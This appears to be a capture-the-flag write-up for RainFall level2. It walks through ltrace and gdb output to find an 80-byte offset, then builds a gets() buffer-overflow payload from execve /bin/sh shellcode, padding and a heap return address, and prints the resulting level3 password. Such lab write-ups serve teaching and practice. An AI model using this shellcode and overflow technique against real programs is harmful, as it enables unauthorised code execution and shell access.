here we can get that the strdup return this address "0x0804a008" in heap
```
   evel2@RainFall:~$ ltrace ./level2 
   __libc_start_main(0x804853f, 1, 0xbffff804, 0x8048550, 0x80485c0 <unfinished ...>
   fflush(0xb7fd1a20) = 0
   gets(0xbffff70c, 0, 0, 0xb7e5ec73, 0x80482b5) = 0xbffff70c
   puts("") = 1
   strdup("") = 0x0804a008
   +++ exited (status 8) +++
```

```
shellcode="\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
```

find the offset:
we disassembe p function, we add breakpoint after calling gets, we run the program, input "aaaaaaaa..." and examine 100 add of esp to get the address of the start of buffer, then info frame to get eip, then eip - <Address of buffer> = 80
```
(gdb) disas p
Dump of assembler code for function p:
   0x080484d4 <+0>:     push   %ebp
   0x080484d5 <+1>:     mov    %esp,%ebp
   0x080484d7 <+3>:     sub    $0x68,%esp
   0x080484da <+6>:     mov    0x8049860,%eax
   0x080484df <+11>:    mov    %eax,(%esp)
   0x080484e2 <+14>:    call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax
   0x080484ea <+22>:    mov    %eax,(%esp)
   0x080484ed <+25>:    call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:    mov    0x4(%ebp),%eax
   0x080484f5 <+33>:    mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:    mov    -0xc(%ebp),%eax
   0x080484fb <+39>:    and    $0xb0000000,%eax
   0x08048500 <+44>:    cmp    $0xb0000000,%eax
   0x08048505 <+49>:    jne    0x8048527 <p+83>
   0x08048507 <+51>:    mov    $0x8048620,%eax
   0x0804850c <+56>:    mov    -0xc(%ebp),%edx
   0x0804850f <+59>:    mov    %edx,0x4(%esp)
   0x08048513 <+63>:    mov    %eax,(%esp)
   0x08048516 <+66>:    call   0x80483a0 <printf@plt>
   0x0804851b <+71>:    movl   $0x1,(%esp)
   0x08048522 <+78>:    call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:    lea    -0x4c(%ebp),%eax
   0x0804852a <+86>:    mov    %eax,(%esp)
   0x0804852d <+89>:    call   0x80483f0 <puts@plt>
   0x08048532 <+94>:    lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:    mov    %eax,(%esp)
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:   leave  
   0x0804853e <+106>:   ret    
End of assembler dump.
(gdb) b *p + 44
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/level2/level2 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Breakpoint 1, 0x08048500 in p ()
(gdb) x/100x $esp
...
0xbffff6d0:     0x080482b5      0x00000000      0x00c30000      0x61616161
0xbffff6e0:     0x61616161      0x61616161      0x61616161      0x61616161
...
(gdb) i frame
Stack level 0, frame at 0xbffff730:
 eip = 0x8048500 in p; saved eip 0x8006161
 called by frame at 0xbffff734
 Arglist at 0xbffff728, args: 
 Locals at 0xbffff728, Previous frame's sp is 0xbffff730
 Saved registers:
  ebp at 0xbffff728, eip at 0xbffff72c
(gdb) p 0xbffff72c - 0xbffff6dc
$1 = 80
```
we write the payload, 
<21 byte of shellcode> + 59 padding + returned add of strdup in little indian

python -c 'print("\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*59 + "\x08\xa0\x04\x08")' > /tmp/hh

(cat /tmp/hh; cat) | ./level2



```
   cat /home/user/level3/.pass
   492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```